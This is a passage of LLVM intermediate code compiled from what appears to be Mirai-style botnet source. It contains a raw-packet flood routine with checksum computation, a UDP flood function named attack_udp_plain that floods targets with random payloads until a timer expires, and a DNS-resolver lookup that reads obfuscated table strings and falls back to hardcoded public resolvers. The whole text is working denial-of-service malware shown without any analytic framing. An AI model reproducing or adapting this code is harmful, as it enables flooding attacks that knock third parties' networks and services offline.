  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 7
  store i16 %344, i16* %346, align 2
  %347 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i32 0, i32 3
  store i16 0, i16* %348, align 2
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %351 = bitcast %struct.udphdr* %350 to i8*
  %352 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %353 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %352, i32 0, i32 2
  %354 = load i16, i16* %353, align 2
  %355 = load i8, i8* %21, align 1
  %356 = zext i8 %355 to i64
  %357 = add i64 21, %356
  %358 = add i64 %357, 2
  %359 = load i32, i32* %23, align 4
  %360 = sext i32 %359 to i64
  %361 = add i64 %358, %360
  %362 = add i64 %361, 4
  %363 = trunc i64 %362 to i32
  %364 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %349, i8* %351, i16 zeroext %354, i32 %363)
  %365 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %366 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %365, i32 0, i32 3
  store i16 %364, i16* %366, align 2
  %367 = load i32, i32* %24, align 4
  %368 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %369 = load i32, i32* %11, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i32 0, i32 0
  %373 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %372, i32 0, i32 2
  %374 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %373, i32 0, i32 0
  store i32 %367, i32* %374, align 4
  %375 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %376 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %375, i32 0, i32 1
  %377 = load i16, i16* %376, align 2
  %378 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %379 = load i32, i32* %11, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i64 %380
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i32 0, i32 0
  %383 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %382, i32 0, i32 1
  store i16 %377, i16* %383, align 2
  %384 = load i32, i32* %12, align 4
  %385 = load i8*, i8** %35, align 8
  %386 = load i8, i8* %21, align 1
  %387 = zext i8 %386 to i64
  %388 = add i64 41, %387
  %389 = add i64 %388, 2
  %390 = load i32, i32* %23, align 4
  %391 = sext i32 %390 to i64
  %392 = add i64 %389, %391
  %393 = add i64 %392, 4
  %394 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %395 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %396 = load i32, i32* %11, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i64 %397
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i32 0, i32 0
  %400 = bitcast %struct.sockaddr_in* %399 to %struct.sockaddr*
  store %struct.sockaddr* %400, %struct.sockaddr** %394, align 8
  %401 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %402 = load %struct.sockaddr*, %struct.sockaddr** %401, align 8
  %403 = call i64 @sendto(i32 %384, i8* %385, i64 %393, i32 16384, %struct.sockaddr* %402, i32 16)
  br label %404

404:                                              ; preds = %332
  %405 = load i32, i32* %11, align 4
  %406 = add nsw i32 %405, 1
  store i32 %406, i32* %11, align 4
  br label %270, !llvm.loop !13

407:                                              ; preds = %270
  %408 = call i64 @time(i64* null) #5
  %409 = load i32, i32* %25, align 4
  %410 = sext i32 %409 to i64
  %411 = icmp sgt i64 %408, %410
  br i1 %411, label %412, label %413

412:                                              ; preds = %407
  br label %414

413:                                              ; preds = %407
  br label %269

414:                                              ; preds = %88, %94, %100, %412
  ret void
}

declare i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  store i32 0, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %11 = call i8* @table_retrieve_val(i32 37, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 37)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %95

15:                                               ; preds = %0
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 38)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 38, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 38)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %94

28:                                               ; preds = %15
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

30:                                               ; preds = %84, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %87

34:                                               ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

41:                                               ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

45:                                               ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

49:                                               ; preds = %45, %41
  br label %84

50:                                               ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

51:                                               ; preds = %50
  br label %52

52:                                               ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

56:                                               ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %69, label %60

60:                                               ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %69, label %64

64:                                               ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub nsw i32 %66, 1
  %68 = icmp eq i32 %65, %67
  br i1 %68, label %69, label %83

69:                                               ; preds = %64, %60, %56
  %70 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %71 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %72 = load i32, i32* %4, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i32, i32* %6, align 4
  %76 = load i32, i32* %4, align 4
  %77 = sub nsw i32 %75, %76
  call void @util_memcpy(i8* %70, i8* %74, i32 %77)
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub nsw i32 %78, %79
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %81
  store i8 0, i8* %82, align 1
  store i8 1, i8* %9, align 1
  br label %87

83:                                               ; preds = %64
  br label %84

84:                                               ; preds = %83, %49
  %85 = load i32, i32* %6, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %6, align 4
  br label %30, !llvm.loop !14

87:                                               ; preds = %69, %30
  %88 = load i8, i8* %9, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %90, label %93

90:                                               ; preds = %87
  %91 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %92 = call i32 @inet_addr(i8* %91) #5
  store i32 %92, i32* %1, align 4
  br label %106

93:                                               ; preds = %87
  br label %94

94:                                               ; preds = %93, %15
  br label %95

95:                                               ; preds = %94, %0
  %96 = call i32 @rand_next()
  %97 = urem i32 %96, 4
  switch i32 %97, label %106 [
    i32 0, label %98
    i32 1, label %100
    i32 2, label %102
    i32 3, label %104
  ]

98:                                               ; preds = %95
  %99 = call i32 @htonl(i32 134744072) #6
  store i32 %99, i32* %1, align 4
  br label %106

100:                                              ; preds = %95
  %101 = call i32 @htonl(i32 1246898730) #6
  store i32 %101, i32* %1, align 4
  br label %106

102:                                              ; preds = %95
  %103 = call i32 @htonl(i32 1074151430) #6
  store i32 %103, i32* %1, align 4
  br label %106

104:                                              ; preds = %95
  %105 = call i32 @htonl(i32 67240450) #6
  store i32 %105, i32* %1, align 4
  br label %106

106:                                              ; preds = %90, %98, %100, %102, %104, %95
  %107 = load i32, i32* %1, align 4
  ret i32 %107
}

declare i32 @util_strlen(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @attack_udp_plain(i32 %0, i8 zeroext %1, %struct.attack_target* %2, i8 zeroext %3, %struct.attack_option* %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias align 16 i8* @calloc(i64 %27, i64 8) #5
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias align 16 i8* @calloc(i64 %31, i64 4) #5
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %50, i8 0, i64 16, i1 false)
  %51 = call i64 @time(i64* null) #5
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = add nsw i64 %51, %53
  %55 = trunc i64 %54 to i32
  store i32 %55, i32* %19, align 4
  %56 = load i16, i16* %15, align 2
  %57 = zext i16 %56 to i32
  %58 = icmp eq i32 %57, 65535
  br i1 %58, label %59, label %62

59:                                               ; preds = %5
  %60 = call i32 @rand_next()
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %15, align 2
  br label %65

62:                                               ; preds = %5
  %63 = load i16, i16* %15, align 2
  %64 = call zeroext i16 @htons(i16 zeroext %63) #6
  store i16 %64, i16* %15, align 2
  br label %65

65:                                               ; preds = %62, %59
  store i32 0, i32* %11, align 4
  br label %66

66:                                               ; preds = %178, %65
  %67 = load i32, i32* %11, align 4
  %68 = load i8, i8* %7, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp slt i32 %67, %69
  br i1 %70, label %71, label %181

71:                                               ; preds = %66
  %72 = call noalias align 16 i8* @calloc(i64 65535, i64 1) #5
  %73 = load i8**, i8*** %12, align 8
  %74 = load i32, i32* %11, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8*, i8** %73, i64 %75
  store i8* %72, i8** %76, align 8
  %77 = load i16, i16* %14, align 2
  %78 = zext i16 %77 to i32
  %79 = icmp eq i32 %78, 65535
  br i1 %79, label %80, label %89

80:                                               ; preds = %71
  %81 = call i32 @rand_next()
  %82 = trunc i32 %81 to i16
  %83 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %84 = load i32, i32* %11, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %83, i64 %85
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i32 0, i32 0
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %87, i32 0, i32 1
  store i16 %82, i16* %88, align 2
  br label %98

89:                                               ; preds = %71
  %90 = load i16, i16* %14, align 2
  %91 = call zeroext i16 @htons(i16 zeroext %90) #6
  %92 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %93 = load i32, i32* %11, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %92, i64 %94
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i32 0, i32 0
  %97 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %96, i32 0, i32 1
  store i16 %91, i16* %97, align 2
  br label %98

98:                                               ; preds = %89, %80
  %99 = call i32 @socket(i32 2, i32 2, i32 17) #5
  %100 = load i32*, i32** %13, align 8
  %101 = load i32, i32* %11, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i32, i32* %100, i64 %102
  store i32 %99, i32* %103, align 4
  %104 = icmp eq i32 %99, -1
  br i1 %104, label %105, label %106

105:                                              ; preds = %98
  br label %224

106:                                              ; preds = %98
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %107, align 4
  %108 = load i16, i16* %15, align 2
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %108, i16* %109, align 2
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %111 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %110, i32 0, i32 0
  store i32 0, i32* %111, align 4
  %112 = load i32*, i32** %13, align 8
  %113 = load i32, i32* %11, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i32, i32* %112, i64 %114
  %116 = load i32, i32* %115, align 4
  %117 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %118 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %118, %struct.sockaddr** %117, align 8
  %119 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %120 = load %struct.sockaddr*, %struct.sockaddr** %119, align 8
  %121 = call i32 @bind(i32 %116, %struct.sockaddr* %120, i32 16) #5
  %122 = icmp eq i32 %121, -1
  br i1 %122, label %123, label %124

123:                                              ; preds = %106
  br label %124

124:                                              ; preds = %123, %106
  %125 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %126 = load i32, i32* %11, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i64 %127
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %128, i32 0, i32 2
  %130 = load i8, i8* %129, align 4
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %131, 32
  br i1 %132, label %133, label %159

133:                                              ; preds = %124
  %134 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %135 = load i32, i32* %11, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #6
  %141 = call i32 @rand_next()
  %142 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %143 = load i32, i32* %11, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %142, i64 %144
  %146 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %145, i32 0, i32 2
  %147 = load i8, i8* %146, align 4
  %148 = zext i8 %147 to i32
  %149 = lshr i32 %141, %148
  %150 = add i32 %140, %149
  %151 = call i32 @htonl(i32 %150) #6
  %152 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %153 = load i32, i32* %11, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 0
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %156, i32 0, i32 2
  %158 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %157, i32 0, i32 0
  store i32 %151, i32* %158, align 4
  br label %159

159:                                              ; preds = %133, %124
  %160 = load i32*, i32** %13, align 8
  %161 = load i32, i32* %11, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i32, i32* %160, i64 %162
  %164 = load i32, i32* %163, align 4
  %165 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %166 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %167 = load i32, i32* %11, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 0
  %171 = bitcast %struct.sockaddr_in* %170 to %struct.sockaddr*
  store %struct.sockaddr* %171, %struct.sockaddr** %165, align 8
  %172 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %173 = load %struct.sockaddr*, %struct.sockaddr** %172, align 8
  %174 = call i32 @connect(i32 %164, %struct.sockaddr* %173, i32 16)
  %175 = icmp eq i32 %174, -1
  br i1 %175, label %176, label %177

176:                                              ; preds = %159
  br label %177

177:                                              ; preds = %176, %159
  br label %178

178:                                              ; preds = %177
  %179 = load i32, i32* %11, align 4
  %180 = add nsw i32 %179, 1
  store i32 %180, i32* %11, align 4
  br label %66, !llvm.loop !15

181:                                              ; preds = %66
  br label %182

182:                                              ; preds = %181, %223
  store i32 0, i32* %11, align 4
  br label %183

183:                                              ; preds = %214, %182
  %184 = load i32, i32* %11, align 4
  %185 = load i8, i8* %7, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  br i1 %187, label %188, label %217

188:                                              ; preds = %183
  %189 = load i8**, i8*** %12, align 8
  %190 = load i32, i32* %11, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %25, align 8
  %194 = load i8, i8* %17, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %204

196:                                              ; preds = %188
  %197 = load i8*, i8** %25, align 8
  %198 = load i16, i16* %16, align 2
  %199 = zext i16 %198 to i32
  call void @rand_alphastr(i8* %197, i32 %199)
  %200 = load i8*, i8** %25, align 8
  %201 = load i16, i16* %16, align 2
  %202 = zext i16 %201 to i64
  %203 = getelementptr inbounds i8, i8* %200, i64 %202
  store i8 0, i8* %203, align 1
  br label %204

204:                                              ; preds = %196, %188
  %205 = load i32*, i32** %13, align 8
  %206 = load i32, i32* %11, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i32, i32* %205, i64 %207
  %209 = load i32, i32* %208, align 4
  %210 = load i8*, i8** %25, align 8
  %211 = load i16, i16* %16, align 2
  %212 = zext i16 %211 to i64
  %213 = call i64 @send(i32 %209, i8* %210, i64 %212, i32 16384)
  br label %214

214:                                              ; preds = %204
  %215 = load i32, i32* %11, align 4
  %216 = add nsw i32 %215, 1
  store i32 %216, i32* %11, align 4
  br label %183, !llvm.loop !16

217:                                              ; preds = %183
  %218 = call i64 @time(i64* null) #5
  %219 = load i32, i32* %19, align 4
  %220 = sext i32 %219 to i64
  %221 = icmp sgt i64 %218, %220
  br i1 %221, label %222, label %223

222:                                              ; preds = %217
  br label %224

223:                                              ; preds = %217
  br label %182

224:                                              ; preds = %105, %222
  ret void
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

declare i64 @send(i32, i8*, i64, i32) #2

declare i32 @open(i8*, i32, ...) #2

declare void @table_lock_val(i8 zeroext) #2

declare i64 @read(i32, i8*, i64) #2

declare i32 @util_stristr(i8*, i32, i8*) #2

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
